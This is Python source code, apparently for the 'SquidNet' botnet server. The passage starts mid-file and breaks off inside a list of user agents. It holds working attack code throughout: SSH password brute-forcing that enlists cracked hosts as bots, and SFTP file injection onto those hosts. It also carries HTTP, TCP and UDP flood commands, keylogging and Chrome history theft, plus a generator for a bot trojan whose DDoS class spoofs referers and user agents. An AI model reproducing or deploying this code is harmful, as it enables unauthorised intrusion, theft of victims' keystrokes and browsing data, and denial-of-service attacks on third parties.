        msgtoadmin = f"[(SERVER)]: Brute Forcing the Password for: {username}@{ip}\n"
        self.log('\n' + msgtoadmin)
        for admin in self.admin_conn:
            try:
                admin.send(msgtoadmin.encode())
            except:
                pass
        flag = 0
        for password in self.passwords:
            try:
                if flag == 1:
                    break
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                passw = password.strip()
                client.connect(ip, 22, username, passw, timeout=2, auth_timeout=2)
                self.ips.append(ip)
                self.display_bots.append(f"{username}@{ip}")
                self.ssh_bots.append(client)
                self.ssh_info.append(str(username) + " " + str(ip) + " " + str(passw))
                self.ssh_botlist.append(str(client) + ' ' + str(username))
                msgtoadmin = f"[(SERVER)]: {ip}'s Password has been found!: {passw}\n[(SERVER)] Adding {username}@{ip} to the botnet.\n"
                self.log('\n' + msgtoadmin)
                for admin in self.admin_conn:
                    try:
                        admin.send(msgtoadmin.encode())
                    except:
                        pass
                print(f"\n[!] {ip}'s Password has been found!: {passw}\n[!] Adding {username}@{ip} to the botnet.\n")
                flag = 1
                break
            except:
                client.close()
        if flag == 0:
            msgtoadmin = f"[(SERVER)]: Unable to Brute Force password for {username}@{ip}"
            self.log("\n" + msgtoadmin)
            for admin in self.admin_conn:
                try:
                    admin.send(msgtoadmin.encode())
                except:
                    pass
            print(f"\n[?] Unable to Brute Force password for {username}@{ip}")
    def send_ssh(self, instruction):
        """Sends instructions to the SSH-Bots. The output will also be sent
        back to the Server for the admins to see."""
        try:
            for bot in self.ssh_bots:
                for usernames in self.ssh_botlist:
                    if str(bot) in usernames:
                        split_item = usernames.split()
                        username = split_item[4]
                try:
                    stdin, stdout, stderr = bot.exec_command(instruction, get_pty=True)
                    stdin.close()
                    output = stdout.read().decode()
                    if output.strip() == "":
                        pass
                    else:
                        msgtoclient = f"\n[({username})]: {output.strip()}"
                        self.log(msgtoclient)
                        print(msgtoclient)
                        for admin in self.admin_conn:
                            try:
                                admin.send(msgtoclient.encode())
                            except:
                                self.log(f"[(ERROR)]: Unable to send message to {admin}.")
                except:
                    bot.close()
        except:
            pass
    def ssh_inject(self, client, file):
        """This function Opens up SFTP(Secure File Transfer Protocol) and
        sends a file to the SSH-Bots, where they can be opened up on command."""
        try:
            if "/" in file or "\\" in file:
                result = ""
                for letter in file:
                    if letter == "/" or letter == "\\":
                        result += " "
                    else:
                        result += letter
                split_result = result.split()
                file = split_result[(len(split_result) - 1)]
                file_dir = ""
                for item in split_result:
                    if item == file:
                        pass
                    else:
                        file_dir = file_dir + item + "/"
                os.chdir(file_dir)
            for usernames in self.ssh_botlist:
                if str(client) in usernames:
                    split_item = usernames.split()
                    username = split_item[4]
            try:
                sftp = client.open_sftp()
                sftp.put(file, f'C:/{username}/{file}')
            except:
                sftp = client.open_sftp()
                sftp.put(file, f'/Users/{username}/{file}')
            os.chdir(self.cwd)
        except:
            pass
    def reset_historyvar(self):
        """Resets the 'self.obtaininghistory' variable to false,
        so that the bot messages would return to normal."""
        time.sleep(10)
        self.obtaininghistory = False
        self.historyfile.close()
        print("\n[+] You are now able to freely send messages to the bots.")
    def instruct(self):
        """Server-Side Sending intructions to the bots. This is so that the Server
        can also send packets to the Bots which they can send info back to the Server
        and admins."""
        self.savefile = False
        while True:
            try:
                self.instruction = input("[+] Enter instruction to the bots: ")
                if self.instruction == "!botcount":
                    print(f"[+] Current Connected Bots: {self.bot_count}\n")
                elif self.instruction == "!clear":
                    if sys.platform == "win32":
                        os.system("cls")
                    else:
                        os.system("clear")
                    self.logo()
                    self.usage()
                elif self.instruction.startswith('!savefile'):
                    instruction_split = self.instruction.split()
                    self.botfile = instruction_split[1]
                    self.savefile = True
                    print("[+] Savefile commenced")
                elif self.instruction.startswith("!genadminscript"):
                    filename = "SquidNetMaster.py"
                    contents = self.gen_admin()
                    file = open(filename, 'w')
                    file.write(contents)
                    file.close()
                    print(f"[+] File '{filename}' has been generated in dir '{os.getcwd()}'\n")
                    self.log(f"\n[(FILECREATION)]: File '{filename}' has been generated in dir '{os.getcwd()}'\n")
                elif self.instruction.startswith("!httpflood"):
                    msgtobot = self.instruction.split()
                    try:
                        targ_website = msgtobot[1]
                        atk_delay = msgtobot[2]
                        print(f"[+] Beginning HTTP Flood Attack on {targ_website} with delay of {atk_delay}.\n")
                    except:
                        self.instruction = "help"
                        print("[+] Invalid Parameters!\n")
                elif self.instruction.startswith("!getchromehistory"):
                    self.obtaininghistory = True
                    print(
                        "[+] Obtaining Bot Chrome history. It is highly suggested you do not give any commands at the moment.")
                    print("[+] Please wait 10 seconds before doing anything.")
                    self.historyfile = open("BotsHistory.txt", "wb")
                    print("[+] File with Bot Chrome History: BotsHistory.txt")
                    resetter = threading.Thread(target=self.reset_historyvar)
                    resetter.start()
                elif self.instruction.startswith("!tcpflood"):
                    msgtobot = self.instruction.split()
                    try:
                        target = msgtobot[1]
                        print(f"[+] Beginning TCP Flood Attack on {target}.\n")
                    except:
                        self.instruction = "help"
                        print("[+] Invalid Parameters!\n")
                elif self.instruction.startswith("!udpflood"):
                    msgtobot = self.instruction.split()
                    try:
                        target = msgtobot[1]
                        print(f"[+] Beginning UDP Flood Attack on {target}.\n")
                    except:
                        self.instruction = "help"
                        print("[+] Invalid Parameters!\n")
                elif self.instruction == "!resettoken":
                    self.key = Fernet.generate_key()
                    with open('token.txt', 'w') as tokenfile:
                        tokenfile.write(str(self.key))
                        tokenfile.close()
                    print(
                        f"[+] The token has been reset to: {str(self.key)}\n[+] Note that you should regenerate a script to have the same token as the one in this script.\n")
                    self.log(f"\n[(TOKENRESET)]: Encryption key changed to: {str(self.key)}")
                elif self.instruction == "!genscript":
                    filename = 'SquidNetBot.py'
                    file = open(filename, 'w')
                    contents = self.bot_script()
                    file.write(contents)
                    file.close()
                    print(f"[+] File '{filename}' has been generated in dir '{os.getcwd()}'\n")
                    self.log(f"\n[(FILECREATION)]: File '{filename}' has been generated in dir '{os.getcwd()}'\n")
                elif self.instruction == "!stopatk":
                    print("[+] Attempting to stop all DDoS Attacks in the botnet.\n")
                    self.log("\n[(STOPATK)]: Attempting to stop all DDoS Attacks in the botnet.\n")
                elif self.instruction == "!help":
                    self.usage()
                elif self.instruction.startswith("!infect"):
                    if self.passfile != False:
                        instruction_split = self.instruction.split()
                        ip = instruction_split[1]
                        username = instruction_split[2]
                        brute_force = threading.Thread(target=self.ssh_infect, args=(ip, username))
                        brute_force.start()
                    else:
                        print("[+] Unable to bruteforce. Configure a password file to do so.\n")
                elif self.instruction.startswith("!inject"):
                    msg_split = self.instruction.split()
                    filename = msg_split[1]
                    self.log(f"\n[(SERVER)]: Infecting all SSH Bots with {filename}")
                    for bot in self.ssh_bots:
                        injector = threading.Thread(target=self.ssh_inject, args=(bot, filename))
                        injector.start()
                elif self.instruction.startswith("!listsshbots"):
                    print(f"[+] Connected SSH Bots: {self.display_bots}")
                elif self.instruction.startswith("!keylog"):
                    msg_split = self.instruction.split()
                    try:
                        self.displaykeys = bool(msg_split[1])
                    except:
                        self.displaykeys = False
                    print(f"[+] Setting Display key-inputs to output to: {self.displaykeys}.")
                    self.log("\n[(SERVER)]: Started Keylogging on the bots.")
                elif self.instruction.startswith("!stopkeylog"):
                    self.log("\n[(SERVER)]: Stopped Keylogging on the bots.")
                elif self.instruction.startswith("!sshlogin"):
                    msg_split = self.instruction.split()
                    ip = msg_split[1]
                    username = msg_split[2]
                    password = msg_split[3]
                    self.ssh_login(ip, username, password)
                elif self.instruction.startswith("!getconninfo"):
                    print(self.gen_conntable())
                    self.log(f"[(SERVER)]: Displayed Conn Table for Server.\n{self.gen_conntable()}")
                elif self.instruction.startswith("!editfile"):
                    msg_split = self.instruction.split()
                    filename = msg_split[1]
                    print(f"[+] Attempting to open file editor for file {filename} on the bots.")
                    self.log(f"\n[(SERVER)]: Attempting to open file editor for file {filename} on the bots.")
                elif self.instruction.startswith("!togglelisten"):
                    if self.listenforconn == True:
                        print("[+] Stopped listening for connections.\n")
                        self.log("\n[(SERVER)]: Stopped listening for connections.")
                        self.listenforconn = False
                    else:
                        print("[+] Restarted listening for connections.\n")
                        self.log("\n[(SERVER)]: Started to listen for connections.")
                        self.listenforconn = True
                elif self.instruction.startswith("!kick"):
                    msg_split = self.instruction.split()
                    host = msg_split[1]
                    port = msg_split[2]
                    conntokick = ""
                    for i in self.connportlist:
                        if host + "" in i and port + " " in i:
                            conntokick = i
                            break
                    if conntokick == "":
                        print("\n[+] Hostname or port is not registered in the botnet.")
                        self.log(
                            f"\n[(SERVER)]: Attempted to kick {host} from source port {port} but it did not exist.")
                    else:
                        for conn in self.conn_list:
                            if str(conn) in conntokick:
                                print(f"\n[+] Successfully kicked {host}.")
                                self.log(f"\n[(SERVER)]: Kicked {host} at source port: {port}")
                                conn.close()
                                break
                elif self.instruction.startswith("!whatsnew"):
                    print("""
[+] New Features In the SquidNet:

[+] - Added Web-Interface(http://127.0.0.1:8080)!
[+] - Fixed Variable bug in regular SSH Login Function(passw-->password)
[+] - Optimized the code.
[+] - Fixed web-interface server slowing down Botnet.
[+] - Fixed NotSamePassException Errors.
[+] - Fixed Error in self.send_ssh that would flood output with errors.
[+] - Fixed Error in Stopping DDoS Attacks(tried to call a bool object and not function).
[+] - Made password list optional(however brute forcing cannot happen).
[+] - Added '!cloneself' Command.
[+] - Fixed more errors on the admins being kicked without reason.
[+] - Upgraded reverse shell messages.
[+] - Added '!getconninfo' Command.
[+] - Made it so that '!clear', '!genscript' and '!genadminscript' are not sent to the clients.
[+] - Fixed typos.
[+] - Added '!kick' and '!togglelisten'
[+] - Added Keylogging to the bots.
[+] - Added display message when there is an error with binding the server.
[+] - Fixed bug that kicks bots when wanting to view content from a file remotely or when sending bytes.
[+] - Improved Logging Function.
[+] - Replace '--nH' and '--nP' arguements with '--eH' and '--eP'(external-host and port).
[+] - Replaced some text in the help message.
[+] - Made default admin password a random integer, rather than 'root'.
[+] - Removed unnessecary modules.
[+] - Chrome history obtaining is now possible on the bots ;).
[+] - Changed hashing algorithim to sha256.
                    """)
                if "!clear" in self.instruction.strip() or "!genscript" in self.instruction.strip() or "!genadminscript".strip() in self.instruction.strip() or "!whatsnew" in self.instruction.strip() or "!getconninfo" in self.instruction.strip() or "listsshbots" in self.instruction.strip() or "!togglelisten" in self.instruction.strip():
                    pass
                else:
                    if len(self.ssh_bots) != 0:
                        sendtossh = threading.Thread(target=self.send_ssh, args=(self.instruction,))
                        sendtossh.start()
                    self.log(f"\n[(SERVER)---->(ADMINS)]: Sent '{self.instruction}' to the bots.")
                    for conn in self.conn_list:
                        try:
                            if conn in self.admin_conn:
                                conn.send(f"[(SERVER)]: Sent '{self.instruction}' to the bots.".encode())
                            else:
                                conn.send(self.instruction.encode())
                        except:
                            self.log(f"\n[(ERROR)]: Unable to send message to {conn}.")
                self.log(f"\n[(SERVER)]: {self.instruction}")
            except Exception as e:
                self.log(f"\n[(ERROR)]: {str(e)}")
    def gen_admin(self):
        """Generates the admin for remote admin connections to the BotNet."""
        script = """
import socket, threading, os, time, urllib.request, sys
class BotMaster:
    def __init__(self, ip, port, name, admin_password):
        self.ip = ip
        self.port = port
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.ip, self.port))
        msg = str(socket.gethostname() + " " + self.getip() + " " + os.getlogin()+" "+sys.platform).encode()
        self.client.send(msg)
        self.name = name
        self.admin_password = admin_password
        time.sleep(1)
        self.client.send("!CLIENTLOG".encode())
        time.sleep(1)
        self.client.send(f"!login {self.name} {self.admin_password}".encode())
        self.logo()
        print("\\n[+] Successfully logged into the Botnet!")
        print("[+] You are able to access the Botnet and also give commands to all of the connected bots!")
        print("")
        self.reciever = threading.Thread(target=self.recv)
        self.reciever.start()
        self.sender = threading.Thread(target=self.send)
        self.sender.start()
    def logo(self):
        print('''
  _____             _     _ __  __           _            
 / ____|           (_)   | |  \/  |         | |           
| (___   __ _ _   _ _  __| | \  / | __ _ ___| |_ ___ _ __ 
 \___ \ / _` | | | | |/ _` | |\/| |/ _` / __| __/ _ \ '__|
 ____) | (_| | |_| | | (_| | |  | | (_| \__ \ ||  __/ |   
|_____/ \__, |\__,_|_|\__,_|_|  |_|\__,_|___/\__\___|_|   
           | |                                            
           |_|                                                                                                      
SquidNet Admin Script By DrSquid''')
    def getip(self):
        try:
            url = 'https://httpbin.org/ip'
            req = urllib.request.Request(url)
            result = urllib.request.urlopen(req)
            try:
                result = result.read().decode()
            except:
                result = result.read()
            contents = result.split()
            ip = contents[2].strip('"')
            return ip
        except:
            pass
    def send(self):
        while True:
            try:
                msg = input("[(ADMIN)]: ")
                self.client.send(msg.encode())
            except:
                print("[+] There may be a server error. Try to relogin to the botnet.")
    def recv(self):
        while True:
            try:
                msg = self.client.recv(65500).decode()
                if msg == "":
                    pass
                else:
                    print('\\n' + msg)
            except:
                print("\\n[+] Possible Server Error! Try to re-login to the Botnet!")
                print("[+] If this is a re-occuring message, contact the Server Owner.")
                print("\\n[+] Attempting to re-connect to the server.")
                while True:
                    try:
                        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        self.client.connect((self.ip, self.port))
                        msg = str(
                            socket.gethostname() + " " + self.getip() + " " + os.getlogin() + " " + sys.platform).encode()
                        self.client.send(msg)
                        time.sleep(1)
                        self.client.send("!CLIENTLOG".encode())
                        time.sleep(1)
                        self.client.send(f"!login {self.name} {self.admin_password}".encode())
                        print("[+] Successfully Logged Back Into the botnet.")
                        break
                    except:
                        pass
admin = BotMaster('""" + self.ngroklink + """',""" + str(
            self.ngrokport) + """,'""" + self.admin_name + """','""" + self.passw + """')      
        """
        return script
    def bot_script(self):
        """Generates the Bot Trojan Script needed to connect to this server and run commands from it.
        Test it and see what it does! It will respond to all commands, and it will do either any of
        the in-built commands or run any other instructions with command prompt/terminal."""
        script = """
#-----SquidNet-Bot-Script-----#
import socket, time, os, threading, urllib.request, shutil, sys, random, base64, sqlite3, json, subprocess, re, shutil
from datetime import datetime, timedelta
try:
    from pynput.keyboard import Listener # pip install pynput
except:
    pass
try:
    import win32crypt # pip install pypiwin32
except:
    pass
try:
    from cryptography.fernet import Fernet # pip install cryptography
except:
    pass
try:
    from Crypto.Cipher import AES # pip install pycryptodome
except:
    pass
class DDoS:
    def __init__(self, ip, delay):
        self.ip = ip
        self.delay = delay
        self.stopatk = False
        self.useragents = self.obtain_user_agents()
        self.referers = self.obtain_referers()
        self.threader = threading.Thread(target=self.start_thr)
        self.threader.start()
    def obtain_referers(self):
        referers = ['http://www.google.com/?q=', 'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..',
                    'http://vk.com/profile.php?redirect=', 'http://www.usatoday.com/search/results?q=',
                    'http://engadget.search.aol.com/search?q=query?=query=..',
                    'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882',
                    'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925',
                    'http://yandex.ru/yandsearch?text=',
                    'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832',
                    'http://go.mail.ru/search?mail.ru=1&q=', 'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..',
                    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..',
                    'http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..',
                    'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..',
                    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..',
                    '/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882',
                    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..',
                    'http://www.google.ru/url?sa=t&rct=?j&q=&e..',
                    'http://help.baidu.com/searchResult?keywords=', 'http://www.bing.com/search?q=',
                    'https://www.yandex.com/yandsearch?text=', 'https://duckduckgo.com/?q=',
                    'http://www.ask.com/web?q=',
                    'http://search.aol.com/aol/search?q=', 'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
                    'https://drive.google.com/viewerng/viewer?url=', 'http://validator.w3.org/feed/check.cgi?url=',
                    'http://host-tracker.com/check_page/?furl=',
                    'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
                    'http://jigsaw.w3.org/css-validator/validator?uri=', 'https://add.my.yahoo.com/rss?url=',
                    'http://www.google.com/?q=', 'http://www.google.com/?q=', 'http://www.google.com/?q=',
                    'http://www.usatoday.com/search/results?q=', 'http://engadget.search.aol.com/search?q=',
                    'https://steamcommunity.com/market/search?q=', 'http://filehippo.com/search?q=',
                    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
                    'http://eu.battle.net/wow/en/search?q=',
                    'http://engadget.search.aol.com/search?q=', 'http://careers.gatesfoundation.org/search?q=',
                    'http://techtv.mit.edu/search?q=', 'http://www.ustream.tv/search?q=',
                    'http://www.ted.com/search?q=',
                    'http://funnymama.com/search?q=', 'http://itch.io/search?q=', 'http://jobs.rbs.com/jobs/search?q=',
                    'http://taginfo.openstreetmap.org/search?q=', 'http://www.baoxaydung.com.vn/news/vn/search&q=',
                    'https://play.google.com/store/search?q=', 'http://www.tceq.texas.gov/@@tceq-search?q=',
                    'http://www.reddit.com/search?q=', 'http://www.bestbuytheater.com/events/search?q=',
                    'https://careers.carolinashealthcare.org/search?q=', 'http://jobs.leidos.com/search?q=',
                    'http://jobs.bloomberg.com/search?q=', 'https://www.pinterest.com/search/?q=',
                    'http://millercenter.org/search?q=', 'https://www.npmjs.com/search?q=',
                    'http://www.evidence.nhs.uk/search?q=', 'http://www.shodanhq.com/search?q=',
                    'http://ytmnd.com/search?q=',
                    'http://www.google.com/?q=', 'http://www.google.com/?q=', 'http://www.google.com/?q=',
                    'http://www.usatoday.com/search/results?q=', 'http://engadget.search.aol.com/search?q=',
                    'https://steamcommunity.com/market/search?q=', 'http://filehippo.com/search?q=',
                    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
                    'http://eu.battle.net/wow/en/search?q=',
                    'http://engadget.search.aol.com/search?q=', 'http://careers.gatesfoundation.org/search?q=',
                    'http://techtv.mit.edu/search?q=', 'http://www.ustream.tv/search?q=',
                    'http://www.ted.com/search?q=',
                    'http://funnymama.com/search?q=', 'http://itch.io/search?q=', 'http://jobs.rbs.com/jobs/search?q=',
                    'http://taginfo.openstreetmap.org/search?q=', 'http://www.baoxaydung.com.vn/news/vn/search&q=',
                    'https://play.google.com/store/search?q=', 'http://www.tceq.texas.gov/@@tceq-search?q=',
                    'http://www.reddit.com/search?q=', 'http://www.bestbuytheater.com/events/search?q=',
                    'https://careers.carolinashealthcare.org/search?q=', 'http://jobs.leidos.com/search?q=',
                    'http://jobs.bloomberg.com/search?q=', 'https://www.pinterest.com/search/?q=',
                    'http://millercenter.org/search?q=', 'https://www.npmjs.com/search?q=',
                    'http://www.evidence.nhs.uk/search?q=', 'http://www.shodanhq.com/search?q=',
                    'http://ytmnd.com/search?q=',
                    'http://www.google.com/?q=', 'http://www.google.com/?q=', 'http://www.google.com/?q=',
                    'http://www.usatoday.com/search/results?q=', 'http://engadget.search.aol.com/search?q=',
                    'https://steamcommunity.com/market/search?q=', 'http://filehippo.com/search?q=',
                    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
                    'http://eu.battle.net/wow/en/search?q=',
                    'http://engadget.search.aol.com/search?q=', 'http://careers.gatesfoundation.org/search?q=',
                    'http://techtv.mit.edu/search?q=', 'http://www.ustream.tv/search?q=',
                    'http://www.ted.com/search?q=',
                    'http://funnymama.com/search?q=', 'http://itch.io/search?q=', 'http://jobs.rbs.com/jobs/search?q=',
                    'http://taginfo.openstreetmap.org/search?q=', 'http://www.baoxaydung.com.vn/news/vn/search&q=',
                    'https://play.google.com/store/search?q=', 'http://www.tceq.texas.gov/@@tceq-search?q=',
                    'http://www.reddit.com/search?q=', 'http://www.bestbuytheater.com/events/search?q=',
                    'https://careers.carolinashealthcare.org/search?q=', 'http://jobs.leidos.com/search?q=',
                    'http://jobs.bloomberg.com/search?q=', 'https://www.pinterest.com/search/?q=',
                    'http://millercenter.org/search?q=', 'https://www.npmjs.com/search?q=',
                    'http://www.evidence.nhs.uk/search?q=', 'http://www.shodanhq.com/search?q=',
                    'http://ytmnd.com/search?q=',
                    'http://www.google.com/?q=', 'http://www.google.com/?q=', 'http://www.google.com/?q=',
                    'http://www.usatoday.com/search/results?q=', 'http://engadget.search.aol.com/search?q=',
                    'https://steamcommunity.com/market/search?q=', 'http://filehippo.com/search?q=',
                    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
                    'http://eu.battle.net/wow/en/search?q=',
                    'http://engadget.search.aol.com/search?q=', 'http://careers.gatesfoundation.org/search?q=',
                    'http://techtv.mit.edu/search?q=', 'http://www.ustream.tv/search?q=',
                    'http://www.ted.com/search?q=',
                    'http://funnymama.com/search?q=', 'http://itch.io/search?q=', 'http://jobs.rbs.com/jobs/search?q=',
                    'http://taginfo.openstreetmap.org/search?q=', 'http://www.baoxaydung.com.vn/news/vn/search&q=',
                    'https://play.google.com/store/search?q=', 'http://www.tceq.texas.gov/@@tceq-search?q=',
                    'http://www.reddit.com/search?q=', 'http://www.bestbuytheater.com/events/search?q=',
                    'https://careers.carolinashealthcare.org/search?q=', 'http://jobs.leidos.com/search?q=',
                    'http://jobs.bloomberg.com/search?q=', 'https://www.pinterest.com/search/?q=',
                    'http://millercenter.org/search?q=', 'https://www.npmjs.com/search?q=',
                    'http://www.evidence.nhs.uk/search?q=', 'http://www.shodanhq.com/search?q=',
                    'http://ytmnd.com/search?q=',
                    'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
                    'http://www.google.com/?q=', 'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
                    'https://drive.google.com/viewerng/viewer?url=', 'http://www.google.com/translate?u=',
                    'https://developers.google.com/speed/pagespeed/insights/?url=',
                    'http://help.baidu.com/searchResult?keywords=', 'http://www.bing.com/search?q=',
                    'https://add.my.yahoo.com/rss?url=', 'https://play.google.com/store/search?q=',
                    'http://www.google.com/?q=',
                    'http://www.usatoday.com/search/results?q=', 'http://engadget.search.aol.com/search?q=']
        return referers
    def obtain_user_agents(self):
        user_agents = ['Mozilla/5.0 (Amiga; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14',
               'Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en-US; rv:1.8.1.21) Gecko/20090303 SeaMonkey/1.1.15',
               'Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14',
               'Mozilla/5.0 (Android 2.2; Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
               'Mozilla/5.0 (BeOS; U; BeOS BeBox; fr; rv:1.9) Gecko/2008052906 BonEcho/2.0',
               'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.1) Gecko/20061220 BonEcho/2.0.0.1',
               'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.10) Gecko/20071128 BonEcho/2.0.0.10',
               'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.17) Gecko/20080831 BonEcho/2.0.0.17',
               'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.6) Gecko/20070731 BonEcho/2.0.0.6',
               'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
